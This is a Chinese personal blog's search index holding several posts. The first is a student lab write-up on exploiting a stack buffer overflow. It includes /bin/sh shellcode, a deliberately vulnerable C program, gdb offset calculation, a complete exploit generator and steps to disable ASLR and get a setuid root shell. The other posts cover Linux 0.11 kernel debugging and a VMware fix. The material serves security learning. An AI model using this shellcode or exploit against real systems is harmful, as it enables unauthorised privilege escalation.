<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[入门-缓冲区溢出与利用]]></title>
    <url>%2F2018%2F12%2F07%2Fbof%2F</url>
    <content type="text"><![CDATA[实验原理利用 strcpy(buf,str) 导致的缓冲区溢出，精心构造str溢出后，覆盖原程序的返回地址，让程序跳转至new_addr,去指定位置执行存放的shellcode，获得root权限 重点： str的构造-&gt;计算精确覆盖位置 shellcode 编写-&gt;提权功能，并转化成汇编 exploit 编写 Q: 这和控制流劫持一样吗？有啥区别？会不会控制流劫持是劫持eip？这个只是覆盖返回地址，不太一样？查一下啊！ 实验步骤1. 环境搭建1) Ubuntu12.04 32位 （http://releases.ubuntu.com/12.04.5/ubuntu-12.04.5-desktop-i386.iso）2) 关闭ASLR sudo sysctl -w kernel.randomize_va_space = 0 sudo sysctl kernel.randomize_va_space (用来查当前值是多少，0：关闭ASLR；***1：开启堆随机化？2：开启栈随机化？***) 3）stack-guard-protection和NX在后续gcc编译时关闭 2. 脚本编写1） shellcode：12345678#include &lt;stdio.h&gt;int main( )&#123; char *name[2]; name[0] = &quot;/bin/sh&quot;; name[1] = NULL; execve(name[0], name, NULL); //主要功能：获得一个shell&#125; 将shellcode转换成汇编形式，并编写call_shellcode调用代码，编译验证能否成功得到shell 【tips】: 如何编写shellcode（之后单写一篇吧） call_shellcode.c12345678910111213141516171819202122232425/* call_shellcode.c *//*A program that creates a file containing code for launching shell*/#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;const char code[] = &quot;\x31\xc0&quot; /* xorl %eax,%eax */ &quot;\x50&quot; /* pushl %eax */ &quot;\x68&quot;&quot;//sh&quot; /* pushl $0x68732f2f */ &quot;\x68&quot;&quot;/bin&quot; /* pushl $0x6e69622f */ &quot;\x89\xe3&quot; /* movl %esp,%ebx */ &quot;\x50&quot; /* pushl %eax */ &quot;\x53&quot; /* pushl %ebx */ &quot;\x89\xe1&quot; /* movl %esp,%ecx */ &quot;\x99&quot; /* cdq */ &quot;\xb0\x0b&quot; /* movb $0x0b,%al */ &quot;\xcd\x80&quot; /* int $0x80 */; //shellcode反汇编而成int main(int argc, char **argv)&#123; char buf[sizeof(code)]; strcpy(buf, code); ((void(*)( ))buf)( ); //？？？&#125; 编译运行 gcc -z execstack -fno-stack-protection -o call_shellcode call_shellcode.c ./call_shellcode $ 成功get shell(可以输id，whoami，ls等验证) 2） stack.c12345678910111213141516171819202122232425262728/* stack.c *//* This program has a buffer overflow vulnerability. *//* Our task is to exploit this vulnerability */#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int bof(char *str)&#123; char buffer[24]; /* The following statement has a buffer overflow problem */ strcpy(buffer, str); return 1;&#125;int main(int argc, char **argv)&#123; char str[517]; FILE *badfile; //创建badfile，之后将shellcode存于此文件 badfile = fopen(&quot;badfile&quot;, &quot;r&quot;); fread(str, sizeof(char), 517, badfile); //shellcode赋给str bof(str); printf(&quot;Returned Properly\n&quot;); return 1;&#125; 关闭地址随机化后，每次运行地址相同。gdb动态调试stack,利用得到的ebp和buffer地址，计算应覆盖的返回地址值，用于exploit的编写 动态调试： $ gcc -z execstack -fno-stack-protector -g -o stack stack.c //要加-g 参数才能构建符号表 $ touch badfile $ gdb stack GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04 Copyright (C) 2012 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type &quot;show copying&quot; and &quot;show warranty&quot; for details. This GDB was configured as &quot;i686-linux-gnu&quot;. For bug reporting instructions, please see: &lt;http://bugs.launchpad.net/gdb-linaro/&gt;... Reading symbols from /home/x/Desktop/xx/stack...done. (gdb) b bof Breakpoint 1 at 0x804848a: file stack.c, line 14. (gdb) run Starting program: /home/x/Desktop/xx/stack Breakpoint 1, bof ( str=0xbffff0f7 &quot;\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220X\361\377\277\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220&quot;...) at stack.c:14 14 strcpy(buffer, str); (gdb) p $ebp $1 = (void *) 0xbffff0d8 (gdb) p &amp;buffer $2 = (char (*)[24]) 0xbffff0b8 (gdb) p 0xbffff0d8-0xbffff0b8 $4 = 32 (gdb) quit 根据调试结果可得，ebp = 0xbffff0d8，返回地址在ebp上面，所以是ret = 0xbffff0d8+4可以跳转去的最小地址是 0xbffff0d8+8输入badfile中的buffer地址与ebp差32，返回地址ret在ebp上4，所以ret = buffer+32+4 4 | ret 4 | ebp 32 | ... | ... | buffer[0] 3） exploit.c为保证成功率，shellcode之前可以添加一些NOP，保证即使地址稍有偏移也可以完成利用123456789101112131415161718192021222324252627282930313233343536/* exploit.c *//* A program that creates a file containing code for launching shell*/#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;char shellcode[]= &quot;\x31\xc0&quot; /* xorl %eax,%eax */ &quot;\x50&quot; /* pushl %eax */ &quot;\x68&quot;&quot;//sh&quot; /* pushl $0x68732f2f */ &quot;\x68&quot;&quot;/bin&quot; /* pushl $0x6e69622f */ &quot;\x89\xe3&quot; /* movl %esp,%ebx */ &quot;\x50&quot; /* pushl %eax */ &quot;\x53&quot; /* pushl %ebx */ &quot;\x89\xe1&quot; /* movl %esp,%ecx */ &quot;\x99&quot; /* cdq */ &quot;\xb0\x0b&quot; /* movb $0x0b,%al */ &quot;\xcd\x80&quot; /* int $0x80 */;void main(int argc, char **argv)&#123; char buffer[517]; FILE *badfile; /* Initialize buffer with 0x90 (NOP instruction) */ memset(&amp;buffer, 0x90, 517); /* You need to fill the buffer with appropriate contents here */ *((long*)(buffer+36)) = 0xbffff0d8 + 0x80; //buffer+32+4 根据上述调试结果得到 memcpy(buffer+sizeof(buffer)-sizeof(shellcode), shellcode, sizeof(shellcode)); /* Save the contents to the file &quot;badfile&quot; */ badfile = fopen(&quot;./badfile&quot;, &quot;w&quot;); fwrite(buffer, 517, 1, badfile); fclose(badfile);&#125; 3. 脚本运行gcc -o exploit exploit.c ./exploit ./stack $ id uid=1000(s) gid=1000(s) groups=1000(s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare) 成功！ PS： 对stack设置UID，可以拿到root权限 $ gcc -o stack -z execstack -fno-stack-protector stack.c $ sudo chown root stack $ sudo chmod 4755 stack 小结我好讨厌写博客，实验做很快，复盘要很久（尤其调格式简直逼死强迫症==）不过回顾一下理清思路还挺有必要的，写博客麻烦还不是因为脑子乱==sad通过这一个缓冲区溢出的知识点可以展开再写几篇 如何编写shellcode控制流劫持与返回地址覆盖的区别VMware tools安装 先想到这么多，之后再补充]]></content>
      <tags>
        <tag>缓冲区溢出 实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu14.04下，利用QEMU+gdb调试Linux0.11内核]]></title>
    <url>%2F2018%2F09%2F21%2FLinux0-11-debug-with-qemu%2F</url>
    <content type="text"><![CDATA[步骤： 安装Ubuntu虚拟机 搭建调试环境 结合QEMU、gdb，开始调试 具体流程：1.安装Ubuntu虚拟机环境：VMware12，Ubuntu14.04 2.搭建调试环境1)安装必要依赖包（因为我是新安装的干净Ubuntu，里边还缺少常用软件） sudo apt-get update sudo apt-get upgrade (刚开始直接安总是报unable to locate package，应该是需要更新升级一下) sudo apt-get install vim cscope exuberant-ctags build-essential qemu lxterminal 2）下载Linux0.11内核源码到本地https://github.com/yuanxinyu/Linux-0.11 3）解压编译 cd Downloads unzip Linux-0.11-master.zip cd Linux-0.11-master make make start 4）调试 make debug ![](image/linux-0.11/make-debug.PNG&gt; （再开一个终端） gdb tools/system target remote localhost:1234 directory ./Linux-0.11-master //???设置源码目录 set architecture i8086 set dissamembly-flavor intel ![](image/linux-0.11/gdb-bootsect.PNG&gt; 然后似乎就可以gdb调试了？ b *0x7c00 c layout split x /16b 0x7df0 b main 3.gdb调试我还不太熟，每步含义都还要再去学一下 （嗯，先酱，明天继续……） 参考链接：http://blog.chinaunix.net/uid-26299634-id-4943500.htmlhttps://blog.csdn.net/longintchar/article/details/79685055https://github.com/tinyclub/linux-0.11-lab/blob/master/README.md 小结：哇，一开始真的是一脸懵啊，都不知道怎么入手，还好好多大佬都调过啦，还留了教程在网上，参考了几篇博客，也用我三脚猫的功夫仿了个大概，（也还不清楚原理==）目前看上去似乎接下来就是gdb调试代码，一步一步跟着走，看内核怎么运行的了，这块也还需要再看看书然后，听说是gdb版本啊之类的不兼容？所以linux0.11的编译文件啥的有了修改？上边链接里好像是大佬修改好的？等我明天gdb继续调，看别人文档的时候再研究一下（感觉真的好多不会，好多要学啊==大神弟弟说的果然没错）加油！]]></content>
      <tags>
        <tag>Linux内核</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vmware-tips]]></title>
    <url>%2F2018%2F09%2F17%2Fvmware-tips%2F</url>
    <content type="text"><![CDATA[问题：vmware虚拟机启动时遇到弹窗：“二进制转换与此平台长模式不兼容……” 原因：一般是由于电脑系统的 Virtualization Technology虚拟化技术功能 关闭导致的 解决方法：1.开机时按F2进入bios界面2.选择Configuration选项，将其中 Intel Virtual Technology由Disabled改为Enabled3.按F10，保存并退出，即可开启VT虚拟化功能4.保存后会自动重启电脑，之后就OK啦]]></content>
      <tags>
        <tag>Problem&amp;Solution</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[萌新入坑]]></title>
    <url>%2F2018%2F09%2F16%2F%E8%90%8C%E6%96%B0%E5%85%A5%E5%9D%91%2F</url>
    <content type="text"><![CDATA[不好意思啦 刚刚开始搭网站 不完善的地方 还请多多包涵！]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
</search>
